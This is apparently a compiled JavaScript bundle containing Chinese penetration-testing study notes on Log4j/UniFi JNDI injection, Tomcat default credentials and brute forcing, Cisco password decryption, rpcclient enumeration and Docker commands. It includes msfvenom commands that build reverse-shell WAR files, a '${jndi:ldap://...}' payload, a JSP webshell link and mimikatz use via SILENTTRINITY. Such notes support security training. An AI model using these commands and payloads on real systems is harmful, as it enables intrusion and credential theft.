              CVE-2021-44228
                  https://blog.morphisec.com/log4j-exploit-targets-vulnerable-unifi-network-applications
                  \u8F83\u8BE6\u7EC6\uFF1Ahttps://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi

                  \u6D4B\u8BD5\u5E94\u7528\u7A0B\u5E8F\u662F\u5426\u6613\u53D7\u653B\u51FB\u7684\u4E3B\u8981\u65B9\u6CD5\u662F\u5C06\u6B64\u6F0F\u6D1E\u4E0E DNS Canary \u4EE4\u724C\uFF08\u7A0D\u540E\u5C06\u63D0\u4F9B\u66F4\u591A DNS Canary\uFF09\u76F8\u7ED3\u5408\uFF0C\u65B9\u6CD5\u662F\u5C06\uFF1A\${jndi:ldap://<DNS-Canary-Token>/a}\u653E\u5165\u5C3D\u53EF\u80FD\u591A\u7684\u8F93\u5165\u5B57\u6BB5\u4EE5\u53CA\u4EFB\u4F55\u67E5\u8BE2\u53EF\u80FD\u6613\u53D7\u653B\u51FB\u7684\u5185\u5BB9
                      \u5C06\u6570\u636E\u653E\u5728\u5B50\u57DF\u4E2D\u800C\u4E0D\u662F\u4F5C\u4E3A URL \u7684\u539F\u56E0\u662F\u56E0\u4E3A LDAP \u5305\u88C5\u5668\u4E0D\u53D1\u9001 URL
                          \u4F7F\u7528\u6B64\u6F0F\u6D1E\u5229\u7528 DNS \u7A83\u53D6\u6570\u636E\u8981\u5BB9\u6613\u5F97\u591A
                      DNS \u662F\u6700\u53EF\u9760\u7684\u670D\u52A1\u4E4B\u4E00\uFF0C\u56E0\u4E3A\u8BE5\u670D\u52A1\u6700\u4E0D\u53EF\u80FD\u88AB\u963B\u6B62\u3002


                  \u9A8C\u8BC1\uFF1A
                      \u7B2C\u4E00\u6B65\uFF1A\u542F\u52A8\u3010tcpdump\u3011\uFF0C\u76D1\u542C\u3010LDAP\u3011
                      \u7B2C\u4E8C\u6B65\uFF1A\u3010UniFi\u3011\u7684\u3010remember\u3011\u5B57\u6BB5\uFF0C\u586B\u5165\u3010ldap\u670D\u52A1\u3011\u7684\u3010\u6307\u4EE4\u3011\u3002
                      \u7B2C\u4E09\u6B65\uFF0C\u53D1\u9001\u4E0A\u8FF0\u8BF7\u6C42\uFF0C\u89C2\u5BDF\u3010tcpdump\u3011\u6355\u6349\u6D41\u91CF

          \u9ED8\u8BA4\u914D\u7F6E\uFF1A
              \u9ED8\u8BA4\u6570\u636E\u5E93\uFF1A\u3010ace\u3011
                  \u9ED8\u8BA4\u7BA1\u7406\u5458\u8868\uFF1A\u3010admin\u3011
              \u9ED8\u8BA4\u7BA1\u7406\u5458\uFF1A\u3010administrator\u3011

          \u901A\u7528\u529F\u80FD\uFF1A
              \u754C\u9762\u9762\u677F\uFF1A
                  \u6DFB\u52A0\u7F51\u7AD9
                  Dashboard
                  Map\u56FE
                  Devices\u8BBE\u5907
                  Clients\u5BA2\u6237\u7AEF
                  Statistic\u7EDF\u8BA1
                  Insight                 \uFF08\uFF1F\uFF1F\uFF1F\uFF09

                  Events\uFF0C\u7CFB\u7EDF\u4E8B\u4EF6
                  Alerts\uFF0C
                  Settings\uFF0C
                      \u5F88\u591A\u7EC6\u9879
                      \u3010Site\u3011
                          \u3010Device Authentication\u3011
                              UniFi \u63D0\u4F9B SSH \u8EAB\u4EFD\u9A8C\u8BC1\u8BBE\u7F6E\uFF0C\u8BE5\u529F\u80FD\u5141\u8BB8\u60A8\u4ECE\u63A7\u5236\u53F0\u6216\u7EC8\u7AEF\u901A\u8FC7 SSH \u7BA1\u7406\u5176\u4ED6\u63A5\u5165\u70B9\u3002

                              \u53EF\u4EE5\u76F4\u63A5\u770B\u5230\u3010\u8D26\u53F7\u3011\u548C\u3010\u5BC6\u7801\u3011\u3002

          `))},{name:"\u3010Jenkins\u3011\u3001\u30108080\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4ECB\u7ECD\uFF1A

              \u7B2C\u4E00\u4EF6\u4E8B\uFF0C\u8981\u505A\u7684\uFF0C\u5C31\u662F
                  \u3010\u5DF2\u77E5\u7248\u672C\u3011\uFF0C\u662F\u5426\u6709\u3010CVE\u3011\u6216\u8005\u3010\u5176\u5B83\u653B\u51FB\u65B9\u5F0F\u3011\uFF0C\u5728\u7F51\u4E0A\u5DF2\u516C\u5F00\u3002

              \u811A\u672C\u7F16\u5199
                  Jenkins Script Console
                  Groovy Script snippet


          `,u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(zn)))},{name:"\u3010Tomcat\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          Tomcat

              \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801\uFF1A
                  \u8D44\u6599\uFF1A
                      Tomcat\u4E00\u4E9B\u5E38\u89C1\u7684\u9ED8\u8BA4\uFF1A
                          https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
                          HTB\u63D0\u4F9B\u7684\u8D44\u6599\uFF1Ahttps://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
                      \u4E5F\u5305\u62EC\uFF0C\u5176\u5B83\u670D\u52A1\u5668\u7684\u9ED8\u8BA4\uFF1A
                          https://github.com/netbiosX/Default-Credentials

              \u5BC6\u7801\u7206\u7834\u5DE5\u5177
                  \u3010tomcat-brute.py\u3011
                      \u8D44\u6599\uFF1Ahttps://github.com/deo-gracias/oscp/blob/12ed698ac0575bcebd9d489945ab63a2dbd7f6f4/scripts/tomcat-brute.py


              War\u6587\u4EF6\u90E8\u7F72 / War file to deploy
                  \u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF1A
                      \u4E0A\u4F20\u6587\u4EF6
                          msfvenom
                              \u521B\u5EFA\u4E00\u4E2Ashell\uFF0C\u4EE5war\u5305\u7684\u5F62\u5F0F
                                  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war
                                  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

                              \u3010ppaejmsg.jsp\u3011\u6587\u4EF6\u7684\u9605\u8BFB\u89E3\u8BFB\uFF1A
                                  123

                  \u7B2C\u4E8C\u79CD\u65B9\u5F0F\uFF1A
                      \u4F7F\u7528\u3010make-war.sh\u3011+\u3010jsp File browser 1.2\u3011
                          \u8D44\u6599\uFF1A
                              \u3010make-war.sh\u3011\uFF0C\u53EA\u662F\u4E00\u4E2A\u7B80\u5355\u7684\u5305\u88C5\u811A\u672C\uFF1A\u7565
                              \u3010jsp File browser 1.2\u3011\uFF1Ahttps://github.com/tennc/webshell/blob/master/jsp/jspbrowser/Browser.jsp

              \u3010SILENTTRINITY\u3011agent\u4EE3\u7406

                  \u8D44\u6599\uFF1A
                      \u76F8\u5173\u6F14\u793A\u89C6\u9891\uFF1Ahttps://www.youtube.com/watch?v=-O3SPrYhAMo
                  \u4ECB\u7ECD\uFF1A
                      \u662F\u4E00\u6B3E\u65B0\u578B\u7684\u3010\u540E\u6E17\u900Fpost-exploitation\u3011agent\u4EE3\u7406\u5DE5\u5177\u3002\u4F7F\u7528 Python, IronPython, C#/.NET \u5F00\u53D1\u3002
                      \u56FD\u5185\u7684\u666E\u53CA\u5EA6\uFF0C\u611F\u89C9\u4E5F\u8FD8\u662F\u53EF\u4EE5\u7684\u3002
                  \u5B89\u88C5\u65B9\u5F0F\uFF1A
                      1.git\u62C9\u53D6  2.\u5B89\u88C5\u4F9D\u8D56
                  \u542F\u52A8\uFF1A
                      python  st.py  2>  /dev/null
                  \u5E38\u7528\u6307\u4EE4\uFF1A
                      use  http
                      set  BindIP  <IP\u5730\u5740>
                      start
                      stagers\uFF0C\u5207\u6362

                          \u4E0B\u5C5E\u5B50\u547D\u4EE4

                              use  wmic
                              generate  http

                      list\uFF0C\u5217\u4E3E\u6A21\u5757
                      modules\uFF0C\u67E5\u770B\u3010\u6A21\u5757\u3011

                      use  <\u6A21\u5757\u5982mimikatz>
                          123
                      set  Command  <\u5177\u4F53\u547D\u4EE4>
                      run  <\u8FD9\u4E2A\u662F\u4EC0\u4E48\uFF1F\uFF1F\uFF1F>

                  \u652F\u6301\u7684\u989D\u5916\u9009\u9879\uFF1A
                      \u3010mimikatz\u3011
                          123

                      \u3010execute-assembly\u3011
                          123


          `))},{name:"\u3010Cisco\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          Cisco
              \u5B98\u65B9\uFF0C\u5173\u4E8E\u5404\u79CD\u3010\u52A0\u5BC6\u7C7B\u578B\u3011\u7684\u5165\u95E8\u8BE6\u7EC6\u4ECB\u7ECD\uFF1A
                  https://community.cisco.com/t5/networking-documents/understanding-the-differences-between-the-cisco-password-secret/ta-p/3163238

              Cisco type 7
                  \u5B83\u7C7B\u4F3C\u4E8E\u5728\u4F60\u7684\u914D\u7F6E\u4E2D\u5BF9\u5BC6\u7801\u8FDB\u884C base64 \u7F16\u7801\uFF0C\u6062\u590D\u660E\u6587\u5F88\u7B80\u5355

              secret 5 / type 5


              \u53E6\u5916\u4E00\u6B3E\uFF0C\u5728\u7EBF\u7834\u89E3\u3010Cisco\u3011\u7684\u5DE5\u5177\uFF1A
                  \u3010\u901A\u7528\u578B\u3011\uFF1Ahttps://www.ifm.net.nz/cookbooks/passwordcracker.html
                  \u3010Type 5 \u578B\u3011\uFF1Ahttps://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html


          \u76F8\u5173\u5DE5\u5177\uFF1A

              cisco_pwdecrypt.py
                  https://github.com/axcheron/cisco_pwdecrypt

              ciscot7.py
                  https://github.com/theevilbit/ciscot7

                  python3  ciscot7.py  -d  -p  0242114B0E143F015F5D1E161713
                  python3  ciscot7.py  -d  -p  02375012182C1A1D751618034F36415408


          `))},{name:"\u3010ColorLib\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4E00\u4E2AWordPress\u76F8\u5173\u7684\u3010\u5E93\u3011

          `))},{name:"\u3010OpenNetAdmin\u3011 / \u3010OpenAdmin\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          OpenNetAdmin
              \u4F5C\u4E3ACMS\u641C\u7D22
              \u7B80\u5199\u300Aona\u300B

              \u914D\u7F6E\u6587\u4EF6\uFF1A
                  \u6570\u636E\u5E93\u914D\u7F6E\u6587\u4EF6
                      \u53C2\u8003\u8D44\u6599\uFF1Ahttps://opennetadmin.com/forum_archive/4/t-85.html

                      \u5B58\u653E\u5730\u5740\uFF1A\u3010ona/local/config/database_settings.inc.php\u3011\u3002


          `))}]},cn=qn,In=f("9z6I"),Jn=k.e.singleATag_blank,L={name:"\u3010XSS\u3011_\u624B\u518C",steps:[{name:"\u539F\u7406",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u5E38\u89C1\u8BED\u53E5\u3001\u3010WAF\u3011\u3010\u7ED5\u8FC7\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,n.a.createElement("h1",null,"\u5982\u679C\uFF0C\u4F1A\u88AB\u3010\u6BCF30\u79D2\u63D0\u9192\u3011\u6253\u65AD\uFF0C\u5219\u5173\u95ED\u3010\u4EBA\u751F\u4EFB\u52A1\u3011\u5373\u53EF\uFF01\u3002"),n.a.createElement(In.a,null),u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"XSS\u3010\u76F2\u6253\u540E\u53F0\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]},X=L,Q=k.e.singleATag_blank,Z={name:"\u3010Docker\u3011_\u504F\u6E17\u900F\u65B9\u5411_\u624B\u518C",steps:[{name:"\u5E38\u89C1\u547D\u4EE4",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u955C\u50CF
              docker  image

              \u67E5\u770B
                  docker  image  list  -a

          \u5BB9\u5668
              docker  container

              \u67E5\u770B
                  docker  container  list  -a

                  \u542F\u52A8\u3001\u505C\u6B62\u3001\u5220\u9664

          \u62C9\u53D6
              docker  pull  <\u4ED3\u5E93\u540D/\u955C\u50CF\u540D:\u7248\u672C\u540D>

          \u542F\u52A8
              \u542F\u52A8\u5B9D\u5854
                  docker run -d --restart unless-stopped --name baota -p 8888:8888 -p 22:22 -p 443:443 -p 80:80 -p 888:888 -v ~/baota/website_data:/www/wwwroot -v ~/baota/mysql_data:/www/server/data -v ~/baota/vhost:/www/server/panel/vhost btpanel/baota:lnmp

          \u8FD0\u884C\u547D\u4EE4
              docker exec -it <\u5BB9\u5668id> bash

          \u5E38\u89C1\u9009\u9879
              \u3010--restart  unless-stopped\u3011
                  \u91CD\u542Fdocker\u540E\u81EA\u542F\u5BB9\u5668

              \u3010--name  <\u81EA\u5B9A\u4E49\u5BB9\u5668\u540D>\u3011
                  \u5728\u542F\u52A8\u65F6\uFF0C\u81EA\u5B9A\u4E49\u547D\u540D \u8BE5container\u5BB9\u5668 \u3002

              \u3010-p  <\u771F\u673A\u7AEF\u53E3>:<\u5BB9\u5668\u5185\u7AEF\u53E3>\u3011
                  \u6307\u5B9A  \u5916\u90E8\u5230\u5185\u90E8  \u7AEF\u53E3\u6620\u5C04\u3002

              \u3010-v  <\u771F\u673A\u76EE\u5F55>:<\u5BB9\u5668\u5185\u76EE\u5F55>\u3011
                  \u6307\u5B9A  \u5916\u90E8\u5230\u5185\u90E8  \u76EE\u5F55\u6620\u5C04\u3002

              \u3010--net=host\u3011
                  \uFF1F\uFF1F\uFF1F

          `))},{name:"\u914D\u7F6E\u6587\u4EF6",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4ECB\u7ECD
              \u5728\u521B\u5EFA\u5BB9\u5668\u540E\uFF0C\u8981\u4FEE\u6539\u3010\u5DF2\u6709\u914D\u7F6E\u3011
                  \u8D44\u6599\uFF1Ahttps://blog.51cto.com/u_12020737/2838531

                  \u65B9\u6CD5\u4E00\uFF0C\u5220\u9664\u5BB9\u5668\uFF0C\u91CD\u65B0\u521B\u5EFA\u3002  \uFF08\u4E0D\u63A8\u8350\uFF09

                  \u65B9\u6CD5\u4E8C\uFF0C\u4FEE\u6539\u3010/var/lib/docker/containers/\u5BB9\u5668/config.v2.json\u3011\u6587\u4EF6

                      \u5207\u8BB0\uFF0C\u4FEE\u6539\u5B8C\u540E\uFF0C\u8981\u3010\u91CD\u542FDocker\u670D\u52A1\u3011\u3002
                          1. \u53C2\u8003\u8D44\u6599\uFF1A  https://serverfault.com/a/935855/550538
                          2. \u3010systemctl  restart  docker\u3011\u3002

                      \u4FEE\u6539\u3010MountPoints\u3011\u540E\uFF0C\u8981\u6CE8\u610F\u7684\u4E8B\u60C5
                          \u5728\u7B2C\u4E00\u6B21\u542F\u52A8\u540E\uFF0CDocker\u5185\u7684\u3010\u6587\u4EF6\u6570\u636E\u3011\uFF0C\u4F1A\u88AB\u3010\u771F\u673A\u3011\u7684\u3010\u540C\u540D\u6587\u4EF6\u5939\u3011\u5B8C\u5168\u8986\u76D6\uFF01\uFF01\uFF01
                              \u6240\u4EE5\uFF0C\u4F60\u662F\u53EF\u80FD\u4F1A\u4E22\u6570\u636E\u7684\uFF01
                          \u5207\u8BB0\u505A\u4E00\u4E2A\u5907\u4EFD\uFF01

          `))}]},cu=Z,lu=k.e.singleATag_blank,ru={name:"\u3010RPC\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`



          `))},{name:"\u3010msrpc\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

         `))},{name:"\u3010RpcClient\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          rpcclient  -U  <\u7528\u6237\u540D>  <IP\u5730\u5740>


          \u5B50\u547D\u4EE4\uFF1A
              enumdomusers


              lookupnames  <\u7528\u6237\u540D>
              lookupnames  <SID>
                  \u3010SID\u3011\u8868\u8FBE\u65B9\u5F0F

                      S-1-5-21-4254423774-1266059056-3197185112-500
                          \u300AS-1-5\u300B \uFF0C \u8FD9\u5B9A\u4E49\u4E86\u6807\u8BC6\u7B26\u6388\u6743
                          \u300A21\u20134254423774\u20131266059056\u20133197185112\u300B \uFF0C \u8FD9\u662F\u7279\u5B9A\u4E8E\u57DF\u7684\u6807\u8BC6\u7B26
                          \u300A500\u300B \uFF0C \u6807\u8BC6\u7528\u6237\uFF08\u7BA1\u7406\u5458\u9ED8\u8BA4\u4E3A 500 \uFF09

                      \u53EF\u4EE5\u4E0D\u65AD\u7684\u3010\u679A\u4E3E\u3011\u6700\u540E\u4E00\u4F4D\uFF0C\u6765\u679A\u4E3E \u6240\u6709\u7684\u7528\u6237\u5217\u8868

                      \u3010RID\u3011(Relative Identifier)\uFF0C
                          \u662F\u3010SID\u3011\u7684\u4E00\u90E8\u5206\u3002\u7528\u4E8E\u5728\u3010Windows\u4E3B\u673A\u3011\u4E0A\uFF0C\u552F\u4E00\u6807\u8BC6\u3010\u7528\u6237\u3011\u6216\u3010\u670D\u52A1\u3011\u3002
                              \u672C\u5730RID\u3001\u6216 Domain\u57DF\u540DRID\uFF0C\u603B\u4F1A\u662F\u3010\u4E00\u53F0\u8BA1\u7B97\u673A\u3011\u3002


          `))}]},Eu={name:"\u3010RMI\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u540D\u79F0\uFF1A
              Java\u8FDC\u7A0B\u65B9\u6CD5\u8C03\u7528\uFF0CJRMI
                  \u5168\u79F0\uFF1A(Java remote method invocation)

          \u4ECB\u7ECD\uFF1A
              \u8D44\u6599\uFF1A
                  https://wooyun.js.org/drops/java%20RMI%E7%9B%B8%E5%85%B3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E5%90%88%E5%88%86%E6%9E%90.html
                  https://www.freebuf.com/vuls/324584.html

              \u662F\u7531JDK\u81EA\u5E26\u63D0\u4F9B\u7684\u4E00\u5957\u8FDC\u7A0B\u65B9\u6CD5\u8C03\u7528\u6846\u67B6\uFF0C\u7528\u4E8E\u5B9E\u73B0\u3010\u8DE8JVM\u3011\u95F4\u7684\u65B9\u6CD5\u8C03\u7528\u3002
                  \u5176\u6574\u4F53\u67B6\u6784\u4E0E\u5E38\u89C1\u7684\u3010RPC\u3011\u6846\u67B6\u7C7B\u4F3C\u3002

                  \u91CD\u70B9\uFF1A
                      \u8DE8\u8D8A\u591A\u4E2A\u3010JVM\u3011\u3002\u8FD9\u4F3C\u4E4E\u662F\u8F83\u5E38\u89C1\u7684\u9700\u6C42\uFF1F

          \u76F8\u5173\u6F0F\u6D1E\uFF1A
              \u3010\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3011
                  \u5728java\u4F7F\u7528RMI\u673A\u5236\u65F6\uFF0C\u4F1A\u4F7F\u7528\u5E8F\u5217\u5316\u5BF9\u8C61\u8FDB\u884C\u6570\u636E\u4F20\u8F93\u3002\u8FD9\u5C31\u4F1A\u4EA7\u751F\u3010Java\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3011\u3002\u5229\u7528\u8303\u56F4\u662F\u5F88\u5927\u3002
              \u76F8\u5173\u4E2D\u95F4\u4EF6\uFF1A
                  JBoss RMI\u653B\u51FB\u5229\u7528
                  Spring framework\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C

          `))}]},mu={name:"\u3010RPC\u3011_\u3010RMI\u3011_\u624B\u518C",steps:[ru,Eu]},du=mu,gu=f("QL8i"),Du=f("XRD2"),Ou=f("6CFD"),Tu=f("eFOt"),tu,su=k.e.singleATag_blank,ku={name:"\u3010wappalyzer\u3011    (\u6D4F\u89C8\u5668\u63D2\u4EF6)",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  wappalyzer                                                    \uFF08\u6D4F\u89C8\u5668\u63D2\u4EF6\uFF09

      \u7F51\u9875\u5206\u6790\u63D2\u4EF6\u3002
      \u7F51\u7AD9\u670D\u52A1\u5206\u6790\uFF0C\u6240\u4F7F\u7528\u7684\u63D2\u4EF6\u3002

      \u5404\u79CD\u4E2D\u95F4\u4EF6\u3001\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u7684\u5224\u65AD\uFF1A

          1.\u539F\u56E0\uFF1A
              1.\u5F88\u591A\u5DE5\u5177\uFF0C\u9700\u8981\u6839\u636E\u3010\u4E2D\u95F4\u4EF6\u3011\u3001\u3010\u64CD\u4F5C\u7CFB\u7EDF\u3011\uFF0C\u6765\u5B9A\u4E0B  \u547D\u4EE4\u7B56\u7565\u3002

          2.\u5305\u542B\uFF1A
              1. ASP\u3001ASPX\u3001JSP\u3001PHP
              2. Nginx\u3001Apache


          `))},pu={name:"\u3010\u4FE1\u606F\u6536\u96C6\u3011_\u3010\u5185\u7F51\u4FE1\u606F\u6536\u96C6\u3011_\u5404\u4E2A\u3010\u7248\u672C\u3011_\u76F8\u5173\u3010CVE\u3011_\u624B\u518C",steps:[Ou.b,{name:"\u300A\u5B9A\u6027\u300B\uFF0C\u786E\u5B9A\u65B9\u5411\u2014\u2014\u5177\u4F53\u662F\u54EA\u4E2A\u3010\u7CFB\u5217\u6846\u67B6\u3011",desc:n.a.createElement(n.a.Fragment,null),steps:[ku]},{name:"\u300A\u5B9A\u91CF\u300B\uFF0C\u786E\u5B9A\u7248\u672C\u2014\u2014\u4E0D\u540C\u6846\u67B6\uFF0C\u3010\u6307\u5B9A\u7248\u672C\u3011\u4E0B\u7684\u5DF2\u77E5\u6F0F\u6D1E",desc:n.a.createElement(n.a.Fragment,null),steps:[{name:"\u3010\u6F0F\u6D1E\u3011\u4FE1\u606F",desc_styles:Object(k.f)(400),desc:n.a.createElement(n.a.Fragment,null,n.a.createElement("pre",null,`

          \u57FA\u672C\u7684\u3010\u5DF2\u77E5\u5B58\u5728\u6F0F\u6D1E\u3011\u7684\u516C\u5F00\u4FE1\u606F

          \u3010\u4E91\u670D\u52A1\u5668\u5382\u5546\u3011\u6700\u5728\u610F

          `)),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(Object(u.e)(tu||(tu=Object(h.a)([`

              ~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5

              `,`


              `,`


              `])),Object(u.c)("\u4E0D\u540C\u6846\u67B6\uFF0C\u6307\u5B9A\u7248\u672C\u4E0B\u7684\u5DF2\u77E5\u6F0F\u6D1E\uFF1A",`

              \u7528\u5728\u3010\u7591\u96BE\u6742\u75C7\u5EFA\u8BAE\u3011\u4E2D\u9002\u5408\uFF0C\u4F46\u7528\u5728\u3010SmartStep\u3011\u4E2D\u4E0D\u9002\u5408\uFF01\uFF01\uFF01\u5177\u4F53\u8981\u6539\u7684\u8BDD\uFF0C\u5C31\u8981\u6539\u3010css\u6837\u5F0F\u3011\u3002
              ~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5

              `,{isCollapse:!0,otherCps:[Object(u.c)("\u6309\u3010\u6846\u67B6\u540D\u3011\uFF0C\u641C\u6240\u6709\u7248\u672C\uFF0C\u7684\u7F51\u7AD9\uFF1A",`

                      \u9AD8\u4EF7\u503C\uFF1A


                          \u901A\u7528\uFF0C\u975E\u5E38\u5168\u9762\uFF0C\u72EC\u4E00\u6863\uFF01\uFF01\uFF01
                              1.
                              \u3010SonaType\u3011\uFF0C\u76EE\u524D\u627E\u5230\u6700\u5168\u9762\u7684\u67E5\u8BE2\uFF01
                                  https://ossindex.sonatype.org/
                                      \u76F4\u63A5\u8FDB\u884C\u641C\u7D22\uFF0C\u6709\u5404\u4E2A\u751F\u6001\u7CFB\u7EDF\u2026\u2026
                                      \u4E3E\u4F8B\uFF1Ahttps://ossindex.sonatype.org/component/pkg:maven/com.alibaba/fastjson
                                      \u540C\u65F6\uFF0C\u3010Shiro\u3011\u4E4B\u7C7B\u7684\uFF0C\u4E5F\u80FD\u67E5\u5230


                          \u4E13\u641C\u3010Maven\u3011\u548C\u3010Java\u3011
                              1.
                              \u7B2C\u4E09\u65B9\uFF0C\u5728\u7EBF\u641C\u7D22\uFF1A
                                  https://snyk.io/vuln/maven

                              2.
                              \u5B98\u65B9Maven\u4ED3\u5E93\uFF0C\u6709\u65F6\u4F1A\u663E\u793A\u3010\u4F9D\u8D56\u9879\u6240\u5B58\u5728\u7684\u6F0F\u6D1E\u3011
                                  \u7ECF\u5178\u4F8B\u5B50\uFF1A
                                      \u652F\u4ED8\u5B9D1\uFF1A       https://mvnrepository.com/artifact/com.alipay.sdk/alipay-sdk-java/3.0.3
                                      \u652F\u4ED8\u5B9D2\uFF1A       https://mvnrepository.com/artifact/com.alipay.sdk/alipay-sdk-java/4.22.81.ALL

                              3.
                              \u8FD9\u4E2A\u4ED8\u8D39\u670D\u52A1\uFF0C\u4F3C\u4E4E\u80FD\u63D0\u4F9B\u76F8\u5F53\u7CBE\u786E\u7684lib\u5E93\u7248\u672C\u4FE1\u606F\u3002  \uFF08\u53EF\u60DC\u8981\u4ED8\u8D39\uFF1F\uFF1F  \uFF09
                                  https://sca.analysiscenter.veracode.com/vulnerability-database/security/denial-of-service-dos/java/sid-35014

                              4.
                              \u4E00\u4E9B\u3010\u96C6\u6210\u3011\u7684\u3010\u7248\u672C\u626B\u63CF\u5668\u3011\uFF0C\u9700\u96C6\u6210\u540E\u624D\u53EF\u4F7F\u7528\uFF1A
                                  \u964C\u964C\u5B89\u5168\uFF0C\u516C\u5F00\u7684\u3010mosec-maven-plugin\u3011\u3002
                                      https://github.com/momosecurity/mosec-maven-plugin
                                          \u9700\u96C6\u6210\u5230\u3010pom.xml\u3011\u6587\u4EF6\u3002

                                  \u58A8\u83F2\u5B89\u5168\uFF0C\u4EE3\u7801\u626B\u63CF\u3010Code Scan\u3011\u3002
                                      \u8D44\u6599\uFF1A
                                          \u4ECB\u7ECD\uFF1Ahttps://www.freebuf.com/articles/web/334704.html
                                          \u5B98\u7F51\uFF1Ahttps://www.murphysec.com/
                                      \u4F18\u7F3A\u70B9\uFF1A
                                          1.\u4E5F\u662F\u4E00\u6B3E\u3010Idea\u63D2\u4EF6\u3011\u3002
                                          2.\u80FD\u591F\u5904\u7406\u3010\u4F9D\u8D56\u7248\u672C\u4FE1\u606F\u3011
                                              \u4F46\u662F\u9700\u8981\uFF1A\u9879\u76EE\u7684\u4F9D\u8D56\u4FE1\u606F\u4F1A\u4E0A\u4F20\u5230\u670D\u52A1\u7AEF\uFF0C\u5E76\u57FA\u4E8E\u58A8\u83F2\u5B89\u5168\u6301\u7EED\u7EF4\u62A4\u7684\u6F0F\u6D1E\u77E5\u8BC6\u5E93\u6765\u8BC6\u522B\u9879\u76EE\u4E2D\u5B58\u5728\u5B89\u5168\u7F3A\u9677\u7684\u4F9D\u8D56\u3002
